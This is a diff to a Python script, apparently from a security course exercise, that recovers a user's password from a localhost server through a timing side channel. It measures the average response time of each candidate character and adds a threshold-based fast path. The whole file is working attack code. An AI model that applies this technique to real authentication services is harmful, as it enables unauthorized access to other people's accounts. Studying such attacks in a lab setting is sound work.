@@ -1,14 +1,13 @@
 import time
 import requests
-import numpy as np
+from statistics import mean
 
 # Configuration
-SERVER_URL = "http://127.0.0.1"  # Replace with the server URL, currently hosting on localhost
-USER_ID = "326647914"  # Replace with your ID/Username
-DIFFICULTY = 1  # Adjust difficulty if needed
+SERVER_URL = "http://127.0.0.1"
+USER_ID = "326647914"  # Replace with your ID
+DIFFICULTY = 1         # Adjust difficulty if needed
 CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
-RETRIES = 10  # Number of measurements for each character for greater accuracy
-SIGNIFICANT_THRESHOLD = 1.15  # Factor to determine a significant time increase in time to skip iteration
+RETRIES = 10            # Number of measurements for each character for greater accuracy
 
 
 def measure_time(user, password, difficulty):
@@ -17,19 +16,19 @@ def measure_time(user, password, difficulty):
     Returns the average time after several attempts.
     """
     url = f"{SERVER_URL}/?user={user}&password={password}&difficulty={difficulty}"
-    timings = np.zeros(RETRIES)  # Initialize NumPy array for timings
+    timings = []
 
-    for i in range(RETRIES):
+    for _ in range(RETRIES):
         try:
             start = time.time()
             response = requests.get(url)
             end = time.time()
-            timings[i] = end - start  # Store timing
+            timings.append(end - start)
         except requests.exceptions.RequestException as e:
             print(f"Connection error: {e}")
             return float("inf"), ""
     
-    return np.mean(timings), response.text.strip()
+    return mean(timings), response.text.strip()
 
 
 def find_password_length(user, difficulty):
@@ -57,31 +56,37 @@ def find_password_length(user, difficulty):
 def find_password(user, difficulty, length):
     """
     Finds the password by exploiting average response times.
-    Adds a fast-path check: if a character takes significantly longer,
-    it is immediately selected.
     """
     print(f"Searching for password of length {length}...")
     password = ""
 
     for position in range(length):
-        times = np.zeros(len(CHARACTERS))  # Initialize NumPy array for timings
+        max_time = 0
+        best_char = ""
+        base_times = []  # List to store response times for fast-path check
 
-        for idx, char in enumerate(CHARACTERS):
-            candidate = password + char + "a" * (length - len(password) - 1)
-            response_time, _ = measure_time(user, candidate, difficulty)
+        for i, char in enumerate(CHARACTERS):
+            candidate = password + char + "a" * (length - len(password) - 1)  # Create a candidate password and fill the rest with 'a' to match length
+            response_time, _ = measure_time(user, candidate, difficulty)  # Get an average response time for the candidate password
             print(f"Testing '{candidate}': average time {response_time:.5f}s")
-            times[idx] = response_time
 
-            # Fast path check
-            if idx > 4:  # Only check after a few iterations
-                avg_time = np.mean(times[:idx])  # Calculate mean of previous timings
-                if response_time > SIGNIFICANT_THRESHOLD * avg_time:
+            # Store times for comparison
+            base_times.append((char, response_time))  # Store the character and the response time in a list
+
+            if response_time > max_time:  # Track the character with the highest response time
+                max_time = response_time
+                best_char = char
+
+            # FOR EFFICIENCY ONLY:
+            # Fast path check: If this response time is significantly higher, select it
+            if len(base_times) > 1 and i >= 4:  # If character is not in the first four characters
+                avg_time = mean([time for _, time in base_times[:-1]])  # Exclude current time
+                if response_time > 1.3 * avg_time:  # 1.5x avg time for significant threshold
                     print(f"Fast-path selection: '{char}' due to significant time increase.")
                     password += char
                     break
         else:
-            # Use numpy for max computation
-            best_char = CHARACTERS[np.argmax(times)]
+            # Add the best character after evaluating all candidates
             password += best_char
 
         print(f"Partial password: {password}")
